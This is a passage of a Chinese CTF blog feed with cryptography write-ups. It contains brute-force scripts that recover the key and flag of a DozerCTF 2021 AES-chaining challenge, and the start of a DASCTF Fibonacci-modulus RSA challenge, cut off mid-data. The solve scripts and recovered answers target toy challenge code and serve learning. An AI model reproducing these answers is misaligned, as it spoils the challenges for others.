class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其实只需要知道一条正确的明文就够了，key=C1^M1</span></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我也不知道为什么抄别人的还要写WP，另外找到一个py2的脚本，但是看不懂，他那个好像可以是密文不等长的，先贴一下链接，后续再研究<br><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/</a></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>OTP一次一密</tag>
      </tags>
  </entry>
  <entry>
    <title>20210529 2021DozerCTFCrypto方向部分WP</title>
    <url>/posts/67700515/</url>
    <content><![CDATA[<p>就做出一题。。。</p>
<span id="more"></span>

<h1 id="DozerCTF2021"><a href="#DozerCTF2021" class="headerlink" title="DozerCTF2021"></a>DozerCTF2021</h1><h2 id="手滑的袁学长"><a href="#手滑的袁学长" class="headerlink" title="手滑的袁学长"></a>手滑的袁学长</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer = <span class="built_in">open</span>(<span class="string">&#x27;FLAG1/flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(answer))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Function_enc</span>(<span class="params">msg, key, p_2, c_2</span>):</span></span><br><span class="line">    msg = Padding.pad(msg, <span class="number">16</span>)</span><br><span class="line">    struct = [msg[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">    out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> struct:</span><br><span class="line">        c = strxor(p, c_2)</span><br><span class="line">        c = AES.new(key, AES.MODE_ECB).encrypt(c)</span><br><span class="line"></span><br><span class="line">        out += strxor(p_2, c)</span><br><span class="line">        c_2 = c</span><br><span class="line">        p_2 = p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEY = os.urandom(<span class="number">16</span>)</span><br><span class="line">msg = <span class="string">&#x27;I do not care the result&#x27;</span> + KEY.<span class="built_in">hex</span>()</span><br><span class="line">text = Function_enc(msg.encode(), KEY, answer[:<span class="number">16</span>], answer[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key = &#x27;</span> + KEY.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cipher =&#x27;</span> + text.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>加密算法的大致思路如下，比较简单易懂</p>
<img alt="20210529 DozerCTF2021-bb5bf248.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-bb5bf248.png" width="" height="" >

<p>首先的思路是从后往前做，求出out3之后看看包不包含已知部分，核心思想还是Brute-force</p>
<h4 id="一个小插曲"><a href="#一个小插曲" class="headerlink" title="一个小插曲"></a>一个小插曲</h4><p>一开始以为思路跑偏了，因为袁学长删除的部分是hex之后的，就不是原理四部分组成的out了，但还是先记录下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># flag_length =</span></span><br><span class="line"></span><br><span class="line">hex_num = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================枚举key的============================ #</span></span><br><span class="line">key_hex = <span class="built_in">list</span>(<span class="string">&#x27;2$9cf037f8b3a$2b19b5bda978c294$5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">possible_key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_num:</span><br><span class="line">    key_hex[<span class="number">1</span>] = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_num:</span><br><span class="line">        key_hex[<span class="number">13</span>] = j</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> hex_num:</span><br><span class="line">            key_hex[-<span class="number">2</span>] = k</span><br><span class="line">            possible_key.append(<span class="string">&quot;&quot;</span>.join(key_hex))</span><br><span class="line"><span class="comment"># print(possible_key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================枚举out的============================ #</span></span><br><span class="line">cipher_hex = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb6a20c55719151$$fccecb4$$$$$2a27c8c582c6704f$$$$153bd3313b84235ace16a7b3b190$e487abfa9$cf379d1a3c&#x27;</span></span><br><span class="line">cipher_hex1 = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27;</span></span><br><span class="line">cipher_hex2 = <span class="built_in">list</span>(<span class="string">&#x27;6a20c55719151$$fccecb4$$$$$2a27c&#x27;</span>)</span><br><span class="line">cipher_hex3 = <span class="built_in">list</span>(<span class="string">&#x27;8c582c6704f$$$$153bd3313b84235ac&#x27;</span>)</span><br><span class="line">cipher_hex4 = <span class="built_in">list</span>(<span class="string">&#x27;e16a7b3b190$e487abfa9$cf379d1a3c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">possible_cipher_hex4 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_num:</span><br><span class="line">    cipher_hex4[<span class="number">11</span>] = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_num:</span><br><span class="line">        cipher_hex4[<span class="number">21</span>] = j</span><br><span class="line">        possible_cipher_hex4.append(<span class="string">&quot;&quot;</span>.join(cipher_hex4))</span><br><span class="line"><span class="comment"># print(possible_cipher_hex4)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;DozerCTF&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tmp_key <span class="keyword">in</span> possible_key:</span><br><span class="line">    <span class="comment"># key知道，msg就知道</span></span><br><span class="line">    msg = (<span class="string">&#x27;I do not care the result&#x27;</span> + tmp_key.encode().<span class="built_in">hex</span>()).encode()</span><br><span class="line">    msg = Padding.pad(msg, <span class="number">16</span>)</span><br><span class="line">    struct = [msg[i:i + <span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line">    tmp_m2, tmp_m3, tmp_m4 = struct[<span class="number">1</span>], struct[<span class="number">2</span>], struct[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> tmp_out4 <span class="keyword">in</span> possible_cipher_hex4:</span><br><span class="line">        <span class="comment"># 第四次aes的结果解密</span></span><br><span class="line">        tmp_aes_c4 = strxor(number.long_to_bytes(<span class="built_in">int</span>(tmp_out4, <span class="number">16</span>)), tmp_m3)</span><br><span class="line">        tmp_aes_m4 = AES.new(tmp_key.encode(), AES.MODE_ECB).decrypt(tmp_aes_c4)</span><br><span class="line"></span><br><span class="line">        tmp_aes_c3 = strxor(tmp_m4, tmp_aes_m4)</span><br><span class="line">        tmp_out3 = strxor(tmp_aes_c3, tmp_m2)</span><br><span class="line">        tmp_out3 = tmp_out3.<span class="built_in">hex</span>()</span><br><span class="line">        <span class="keyword">if</span> tmp_out3.startswith(<span class="string">&#x27;8c582c6704f&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(tmp_out3)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p>但后来发现应该没有错，我们自己写了一个flag，然后进行加密，看out输出和hex之后的结果，截取其中的某一段进行hex的反操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># answer = b&#x27;DozerCTF&#123;yuan-xz-weism-yaoshhne&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">out =  <span class="string">b&#x27;\xafF/\xcaM\x1a\xcf\x9b%\x88T\x01\x8a\x1fKb\x04\x85\xd0\xd7\x8d\xb5\x16\xb6\xc5\xd2\xe1\x92\xff\xf3\xe6e\xe0A\x8f\xc5&#123;(GG&gt;\xbd\xff\xbc\xef\xef\xf0X@ .\xd6L\x08,\xa2H\xc3\x1a\xf4&#123;DQB&#x27;</span></span><br><span class="line">cipher = af462fca4d1acf9b258854018a1f4b620485d0d78db516b6c5d2e192fff3e665e0418fc57b2847473ebdffbcefeff05840202ed64c082ca248c31af47b445142</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;0485d0d78db516b6c5d2e192fff3e665&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(c, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>

<p>出来的结果是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\x04\x85\xd0\xd7\x8d\xb5\x16\xb6\xc5\xd2\xe1\x92\xff\xf3\xe6e&#x27;</span></span><br></pre></td></tr></table></figure>

<p>显然结果是完全一样的，至于原理，应该是字节转数字的问题，这里不再深究<br><img alt="20210529 DozerCTF2021-98f6b60a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-98f6b60a.png" width="" height="" ></p>
<p>所以思路的基础没有毛病</p>
<hr>
<p>然后，第二天，脑子清醒点的时候，我在检查中，发现aes的key有问题，之前代码里的key和题目中用来充当密钥的key不是一样的</p>
<p>我随机生成了一个key，并输出hex之后的结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\xdb\x8dL+*\xf0?\x824oy\xf2cY\x95y&#x27;</span></span><br><span class="line"></span><br><span class="line">key_hex = db8d4c2b2af03f82346f79f263599579</span><br></pre></td></tr></table></figure>

<p>用之前的简单转回字节的方法</p>
<img alt="20210529 DozerCTF2021-ada5b99a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-ada5b99a.png" width="" height="" >

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;db8d4c2b2af03f82346f79f263599579&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="string">&#x27;db8d4c2b2af03f82346f79f263599579&#x27;</span>, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>

<p>出来是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;db8d4c2b2af03f82346f79f263599579&#x27;</span></span><br></pre></td></tr></table></figure>

<p>破案啦，显然两个字节流并不一样，问题出在aes的key上</p>
<p>（可能是昨天做懵了）________Orz</p>
<p>然后用hex的反操作就可以逆回去，但不知道是不是幻觉，有几次也没有逆回去，但应该是哪里搞错了，所以学到另外一种hex的反操作</p>
<p>最终的操作如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">KEY = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key = &quot;</span>, KEY)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key_hex = &quot;</span>, KEY.<span class="built_in">hex</span>())</span><br><span class="line">key = KEY.<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tmp_key = &quot;</span>, <span class="built_in">bytes</span>.fromhex(key))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(key, <span class="number">16</span>)))</span><br><span class="line"><span class="keyword">assert</span> KEY == <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line"><span class="keyword">assert</span> KEY == long_to_bytes(<span class="built_in">int</span>(key, <span class="number">16</span>))</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key =  <span class="string">b&#x27;:\xa7\xb6G\x02m\x8f\xcc,n\xa6\xfcH\xea\xc44&#x27;</span></span><br><span class="line">key_hex =  3aa7b647026d8fcc2c6ea6fc48eac434</span><br><span class="line">tmp_key =  <span class="string">b&#x27;:\xa7\xb6G\x02m\x8f\xcc,n\xa6\xfcH\xea\xc44&#x27;</span></span><br><span class="line"><span class="string">b&#x27;:\xa7\xb6G\x02m\x8f\xcc,n\xa6\xfcH\xea\xc44&#x27;</span></span><br></pre></td></tr></table></figure>

<p>当然，有用到key的地方全部要修改</p>
<img alt="20210529 DozerCTF2021-dd7c5f37.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-dd7c5f37.png" width="" height="" >

<hr>
<h4 id="回归正轨"><a href="#回归正轨" class="headerlink" title="回归正轨"></a>回归正轨</h4><p>修改之后的脚本，在一百万次以内就跑出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag_length =</span></span><br><span class="line"></span><br><span class="line">hex_num = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================枚举key的============================ #</span></span><br><span class="line">key_hex = <span class="built_in">list</span>(<span class="string">&#x27;2$9cf037f8b3a$2b19b5bda978c294$5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">possible_key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_num:</span><br><span class="line">    key_hex[<span class="number">1</span>] = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_num:</span><br><span class="line">        key_hex[<span class="number">13</span>] = j</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> hex_num:</span><br><span class="line">            key_hex[-<span class="number">2</span>] = k</span><br><span class="line">            possible_key.append(<span class="string">&quot;&quot;</span>.join(key_hex))</span><br><span class="line"><span class="comment"># print(possible_key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================枚举out的============================ #</span></span><br><span class="line">cipher_hex = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb6a20c55719151$$fccecb4$$$$$2a27c8c582c6704f$$$$153bd3313b84235ace16a7b3b190$e487abfa9$cf379d1a3c&#x27;</span></span><br><span class="line">cipher_hex1 = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27;</span></span><br><span class="line">cipher_hex2 = <span class="built_in">list</span>(<span class="string">&#x27;6a20c55719151$$fccecb4$$$$$2a27c&#x27;</span>)</span><br><span class="line">cipher_hex3 = <span class="built_in">list</span>(<span class="string">&#x27;8c582c6704f$$$$153bd3313b84235ac&#x27;</span>)</span><br><span class="line">cipher_hex4 = <span class="built_in">list</span>(<span class="string">&#x27;e16a7b3b190$e487abfa9$cf379d1a3c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">possible_cipher_hex4 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_num:</span><br><span class="line">    cipher_hex4[<span class="number">11</span>] = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_num:</span><br><span class="line">        cipher_hex4[<span class="number">21</span>] = j</span><br><span class="line">        possible_cipher_hex4.append(<span class="string">&quot;&quot;</span>.join(cipher_hex4))</span><br><span class="line"><span class="comment"># print(possible_cipher_hex4)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;DozerCTF&#123;&#x27;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> tmp_key <span class="keyword">in</span> possible_key:</span><br><span class="line">    <span class="comment"># key知道，msg就知道</span></span><br><span class="line">    msg = (<span class="string">&#x27;I do not care the result&#x27;</span> + tmp_key).encode()</span><br><span class="line">    msg = Padding.pad(msg, <span class="number">16</span>)</span><br><span class="line">    struct = [msg[i:i + <span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line">    tmp_m2, tmp_m3, tmp_m4 = struct[<span class="number">1</span>], struct[<span class="number">2</span>], struct[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> tmp_out4 <span class="keyword">in</span> possible_cipher_hex4:</span><br><span class="line">        <span class="comment"># 第四次aes的结果解密</span></span><br><span class="line">        tmp_aes_c4 = strxor(<span class="built_in">bytes</span>.fromhex(tmp_out4), tmp_m3)</span><br><span class="line">        tmp_aes_m4 = AES.new(<span class="built_in">bytes</span>.fromhex(tmp_key), AES.MODE_ECB).decrypt(tmp_aes_c4)</span><br><span class="line"></span><br><span class="line">        tmp_aes_c3 = strxor(tmp_m4, tmp_aes_m4)</span><br><span class="line">        tmp_out3 = strxor(tmp_aes_c3, tmp_m2)</span><br><span class="line">        tmp_out3 = tmp_out3.<span class="built_in">hex</span>()</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line">        <span class="keyword">if</span> tmp_out3.startswith(<span class="string">&#x27;8c582c6704f&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key_hex =&quot;</span>, tmp_key)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;tmp_aes_m4 =&quot;</span>, tmp_aes_m4)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>跑出来是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key_hex = 279cf037f8b3a92b19b5bda978c294f5</span><br><span class="line">tmp_aes_m4 = <span class="string">b&#x27;\xde@=0N\xbf\x0c\xc0i\x82\x02x\xd6z\x0e\x93&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="最后一击"><a href="#最后一击" class="headerlink" title="最后一击"></a>最后一击</h4><p>什么都已经知道了，剩下的就是还原answer了，四步奏aes，只要一步一步走回去就好了</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><p>贴一下最后的解题脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function_dec</span>(<span class="params">msg_p, key, aes_p</span>):</span></span><br><span class="line">    msg_p = Padding.pad(msg_p, <span class="number">16</span>)</span><br><span class="line">    struct = [msg_p[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_p), <span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">    tmp_c = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> struct[<span class="number">3</span>:<span class="number">0</span>:-<span class="number">1</span>]:</span><br><span class="line">        c = strxor(aes_p, p)</span><br><span class="line">        tmp_c = c</span><br><span class="line">        c = AES.new(key, AES.MODE_ECB).decrypt(c)</span><br><span class="line">        aes_p = c</span><br><span class="line">    <span class="keyword">return</span> tmp_c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_hex = <span class="string">&#x27;279cf037f8b3a92b19b5bda978c294f5&#x27;</span></span><br><span class="line">aes_m4 = <span class="string">b&#x27;\xde@=0N\xbf\x0c\xc0i\x82\x02x\xd6z\x0e\x93&#x27;</span></span><br><span class="line">KEY = <span class="built_in">bytes</span>.fromhex(key_hex)</span><br><span class="line">msg = <span class="string">&#x27;I do not care the result&#x27;</span> + KEY.<span class="built_in">hex</span>()</span><br><span class="line">aes_c1 = function_dec(msg.encode(), KEY, aes_m4)</span><br><span class="line"></span><br><span class="line">out1 = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27;</span></span><br><span class="line">answer1 = strxor(<span class="built_in">bytes</span>.fromhex(out1), aes_c1)</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">b&#x27;I do not care th&#x27;</span></span><br><span class="line">aes_m1 = AES.new(KEY, AES.MODE_ECB).decrypt(aes_c1)</span><br><span class="line">answer2 = strxor(msg1, aes_m1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(answer1 + answer2)</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>第一，查看文档的重要性，我是查了文档之后才发现hex的反操作，一般两种操作是写在一起的，虽说long_to_bytes也可以</p>
<img alt="20210529 DozerCTF2021-4d6e44b1.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-4d6e44b1.png" width="" height="" >

<p>其次是细心吧，确实一上手这种题有点绕，东西有点多，这就体现了画流程图的重要性，还有就是边做边用wp记录的习惯</p>
<p>最后是在发现不对后，怎么回溯的能力也很有帮助</p>
<hr>
<p>感谢尚师傅的鼎力赞助，才让我做出这题</p>
<p>呜呜呜那天三场比赛，算上这道才做出来2道题，呜呜呜留下来菜鸡的眼泪</p>
<p>后面的题目做出来的人也挺多的，有时间复现一下，正经人谁有时间啊</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>20210529 DASCTFXBUUOJ五月大联动Crypto方向部分WP</title>
    <url>/posts/88b63128/</url>
    <content><![CDATA[<p>不是部分啦，就一道呜呜呜，但是草鸡详细哦</p>
<p>xs，我tm根本登不进去，报名时出了点问题</p>
<p>最后直接看别人发在群里的题目了</p>
<p>总共有三题，一道完全不懂，一道好像是椭圆曲线的RelatedMessage，反正就这道题有点思路，因为找到一篇关于斐波那契是RSA模数的论文，打算借此机会研究一下</p>
<span id="more"></span>

<h1 id="DASCTF-X-BUUOJ-五月大联动"><a href="#DASCTF-X-BUUOJ-五月大联动" class="headerlink" title="DASCTF X BUUOJ 五月大联动"></a>DASCTF X BUUOJ 五月大联动</h1><h2 id="Fibonacci"><a href="#Fibonacci" class="headerlink" title="Fibonacci"></a>Fibonacci</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;*************************&#125;&#x27;</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> F(n - <span class="number">1</span>) + F(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p=getPrime(<span class="number">8</span>)</span><br><span class="line">    q=getPrime(<span class="number">1024</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    F=F(n)</span><br><span class="line">    c=<span class="built_in">pow</span>(m,<span class="number">65537</span>,F)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;n = %d&#x27;</span>%(n))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;F(n) = %d&#x27;</span>%(F))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;c = %d&#x27;</span>%(c))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 30039002188673063651200304724856649750424855614713561659816258454033925531379709006718595334296516241593158998074215212142272196270365664747873959581114872378007750905526355257967620809790424857457592189785708634246739647422565451143815984036502331156971328504879840492056807034649796388685443055568787638373563</span></span><br><span class="line"><span class="string">F(n) = 36700337315478358423302463804643502364132894595387679831392170242048570294154137205916046749632259595443511772051005890145681246611711817441148722686433058905309178967626876196428817911402628279151882749816176290631663850711266005570519120688501046610172118214633159846090742563888545000820131558915392759986137704413717356161549696109102298045171982651759736931461029700093546074544216714411268154766313965335118439291477901688458760307733751977411099481922798986947005456033024215394531788003343093192780270571980899284495530589488614458267489897774350955741276841747926401364869628844871476483816139224540693572750083532852690939679488779770278121521966166639184387859708670915429469804929002101080867694318638835470062005769336931710061708165085286293560882862673863182161513175108975599928164057840378446866053785509135134250439675861761412916432659950998041079347609299108756058982586701419597870024243472621875398244582253182771532237956030075796524234449649579003219049</span></span><br><span class="line"><span class="string">c = 5149579488901718498256373861975221458889060262051324713153792274531569740959338672159468511041469512968513162060650323314015111729630790249929764405001469068728832250672432536655958494683225528045534739312500520653653926107616626321646038503307002215682827882897681738805565989931916973526625237494508575698650414426281874530049741540818321302625573676530536769431267223818807952634410781018835593002628264062168865877875709419051886274533984009771861504132373726000546543208681246415153517353772565209140561174813777886487077708362479762600413004602240042298109893816953817393105259401510845057279294044756541864350957113952935658077279981571022227194710269040317178329523984989277421087981594122731035549685470894608888049815174440061043045638797036874542111575347820490125255592416295645107767029867230219384632544284156692872055786752135888144873738488840255388898851551453544530082551649823629868841430161794325580654855230486824210856918330348898081161664747016870749921</span></span><br><span class="line"><span class="string">n = 20756277616755836861796337131683494338352701206928094011019872107808330954223862907177555525893261715593610455375647872190101833907080699823790147515155417500649420182409578349022597139001229776650770207829659368291648098353474620323733162983388953788239424626462428488411835382477744747369092196172727799468129</span></span><br><span class="line"><span class="string">F(n) = 73745878045934636387896195274069826551569516766963182339313590908194755029865664679120132471843611642027469204171633501721641080925317635658799561477123939207311526297390646712571316606381873782191178958234889168599083479590822672109275622907151415552207811665808203751267410151224170154736841450903230193274146578562848780223022725054392389915985290416059522271191922854734627854849084277940339695243325424932830011581455271309868481867791848671985869262214017536640985196012788793460756899871516178490553441223897250090614367273308559864669269965578509523152119870676641602044879271520652270508502838994825168113044092631541016378753797168654004397854528716878554680966919397339024634461107466963998140873416841269245629405227723896214356538994142798927935847118081299628628813983021407779086407107873835131175157418129203731497042769363491200520978441329400751265966093987214492433690588592278950077342020700742819163199408329926294779182691364743193734488228719</span></span><br><span class="line"><span class="string">c = 